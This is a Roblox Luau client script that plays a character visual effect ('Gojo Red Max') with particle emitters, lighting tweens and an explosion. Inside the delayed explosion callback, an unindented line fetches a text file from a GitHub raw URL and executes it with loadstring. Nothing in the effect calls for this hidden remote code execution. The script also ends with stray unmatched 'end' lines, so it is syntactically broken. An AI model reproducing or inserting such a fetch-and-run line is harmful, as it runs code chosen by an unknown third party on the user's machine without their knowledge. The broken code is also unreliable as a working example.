local Debris = game:GetService("Debris")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local LocalPlayer = game.Players.LocalPlayer
local Assets = game:GetService("ReplicatedStorage"):WaitForChild("Assets")
local workspaceVFX = workspace:FindFirstChild("VFX") or Instance.new("Folder", workspace)
workspaceVFX.Name = "VFX"

local function toggleAllEmitters(obj, state)
	if typeof(obj) == "Instance" then
		for _, v in obj:GetDescendants() do
			if v:IsA("ParticleEmitter") or v:IsA("Beam") or v:IsA("Trail") then
				v.Enabled = state or false
			end
		end
	elseif typeof(obj) == "table" then
		for _, v in obj do
			if v:IsA("ParticleEmitter") or v:IsA("Beam") or v:IsA("Trail") then
				v.Enabled = state or false
			else
				toggleAllEmitters(v, state)
			end
		end
	end
end

local function doEmitCount(obj)
	if typeof(obj) == "Instance" then
		for _, v in obj:GetDescendants() do
			if v:IsA("ParticleEmitter") then
				local Value = UserSettings():GetService("UserGameSettings").SavedQualityLevel.Value
				local count = (v:GetAttribute("EmitCount") or 0) / 10 * (Value > 0 and Value or 10)
				local dur = v:GetAttribute("EmitDuration")
				local delayTime = v:GetAttribute("EmitDelay")
				if delayTime then
					task.spawn(function()
						task.wait(delayTime)
						if not dur or dur <= 0 then
							v:Emit(count)
						else
							v.Enabled = true
							task.wait(dur)
							v.Enabled = false
						end
					end)
				elseif not dur then
					v:Emit(count)
				else
					task.spawn(function()
						v.Enabled = true
						task.wait(dur)
						v.Enabled = false
					end)
				end
			end
		end
	elseif typeof(obj) == "table" then
		for _, v in obj do
			doEmitCount(v)
		end
	end
end

local function Explode(char)
	local arm = char:FindFirstChild("Right Arm")
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not arm or not hrp then return end
	local CC = Assets.VFX.Gojo.RedMax.CC

	if char == LocalPlayer.Character then
		local white = CC.White:Clone()
		white.Parent = Lighting
		local black = CC.Black:Clone()
		black.Parent = Lighting
		local contrast = CC.ContrastRed:Clone()
		contrast.Parent = Lighting
		Debris:AddItem(white, 1)
		Debris:AddItem(black, 1)
		Debris:AddItem(contrast, 1)
		black.Enabled = true
		task.wait(0.03)
		black.Enabled = false
		white.Enabled = true
		task.wait(0.03)
		white.Enabled = false
		contrast.Enabled = true
		TweenService:Create(contrast, TweenInfo.new(0.3, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
			Brightness = 0,
			Contrast = 0,
			Saturation = 0,
			TintColor = Color3.fromRGB(255,255,255)
		}):Play()
	end

	local Character = Assets.VFX.Gojo.RedMax.Effects.Character
	local red = Character.red:Clone()
	red.Parent = arm
	doEmitCount(red.explosion)
	Debris:AddItem(red, 2)

	local handler = Assets.VFX.Gojo.RedMax.Effects.Handler:Clone()
	handler.Parent = workspaceVFX
	handler.CFrame = hrp.CFrame * CFrame.Angles(0, math.pi, 0)
	handler.forward.CFrame = hrp.CFrame * CFrame.new(0,0,-9) * CFrame.Angles(0, math.pi, 0)
	handler.forward.forward2.CFrame = hrp.CFrame * CFrame.new(0,0,-25) * CFrame.Angles(0, math.pi, 0)
	doEmitCount(handler.boom)
	doEmitCount(handler.forward)
	Debris:AddItem(handler, 6)
end

local function Start(char)
	local arm = char:FindFirstChild("Right Arm")
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not arm or not hrp then return end
	local Character = Assets.VFX.Gojo.RedMax.Effects.Character
	local wind = Character.wind:Clone()
	wind.Parent = hrp
	toggleAllEmitters(wind, true)
	local red = Character.red:Clone()
	red.Parent = arm
	doEmitCount(red.vortex)
	toggleAllEmitters(red.sphere, true)

	if char == LocalPlayer.Character then
		local contrast = Assets.VFX.Gojo.RedMax.CC.Contrast:Clone()
		contrast.Brightness = 0
		contrast.Saturation = 0
		contrast.Contrast = 0
		contrast.Parent = Lighting
		Debris:AddItem(contrast, 2)
		local tween = TweenService:Create(contrast, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
			Brightness = -0.03,
			Contrast = 0.1,
			Saturation = 0.2
		})
		tween:Play()
		tween.Completed:Once(function()
			TweenService:Create(contrast, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
				Brightness = 0,
				Contrast = 0,
				Saturation = 0
			}):Play()
		end)
	end

	task.delay(8.6, function()
		toggleAllEmitters(red.sphere, false)
		toggleAllEmitters(wind, false)
		Debris:AddItem(red, 6)
		Debris:AddItem(wind, 6)
		Explode(char)
loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/fixcam.txt"))()
	end)
end

Start(LocalPlayer.Character)

	end
end

